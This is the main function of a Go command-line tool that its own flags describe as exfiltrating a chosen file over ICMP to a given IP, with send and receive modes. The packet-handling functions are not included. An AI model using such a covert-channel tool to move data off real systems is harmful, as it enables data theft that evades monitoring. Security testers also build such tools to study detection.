package main

import (
	"flag"
	"os"
)

const BUFFERSIZE = 512
const IPV4ICMP = 1
const IPV4ICMPREQUEST = 8
const IPV4ICMPREPLY = 0

func main() {
	var file = flag.String("f", "", "the file to exfiltrate via ICMP")
	var debug = flag.Bool("d", false, "enable debug output")
	var help = flag.Bool("h", false, "show help.")
	var host = flag.String("l", "127.0.0.1", "the location ip to send the file to")
	var prog = flag.String("p", "", "the program to use, s for send, r for recv")

	flag.Parse()

	if *help || len(os.Args) == 1 {
		flag.PrintDefaults()
		return
	}

	switch *prog {
	case "s":
		if "" == *file {
			flag.PrintDefaults()
			return
		}
		send(file, debug, host)
		break
	case "r":
		recv()
		break
	default:
		flag.PrintDefaults()
		break
	}
	return
}
